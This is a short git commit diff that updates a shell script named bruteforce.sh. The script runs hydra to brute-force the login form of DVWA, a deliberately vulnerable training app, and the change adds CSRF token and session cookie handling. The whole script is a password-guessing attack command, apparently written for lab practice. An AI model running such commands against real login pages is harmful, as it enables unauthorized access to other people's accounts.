fa904b637a33b2ac0ae75f86c972c8ec3dc361bb
PaulSanchez13 <paul.sanchez13770@gmail.com>
2024-04-15 14:46:42 -0400

    [~] Fix bad parameters in bruteforce.sh

--- script_atk/bruteforce.sh
+++ script_atk/bruteforce.sh
@@ -4,5 +4,5 @@ if ["$1" == ""]
 then
 	echo "Usage: ./brute_force.sh [IP] [dico_user.txt] [dico_pswd.txt]"
 else
-	hydra $1 -V -L $2 -P $3 http-post-form "/dvwa/login.php :username=^USER^&password=^PASS^&Login=Login :H=Cookie\:PHPSESSID=753fdb68cccae08c4ae5e0af6efa0bc2; security=low :F=Login failed"
+	hydra $1 -V -L $2 -P $3 http-post-form "/dvwa/login.php :username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login :H=Cookie: security=impossible; PHPSESSID=${SESSIONID} :S=index.php"
 fi
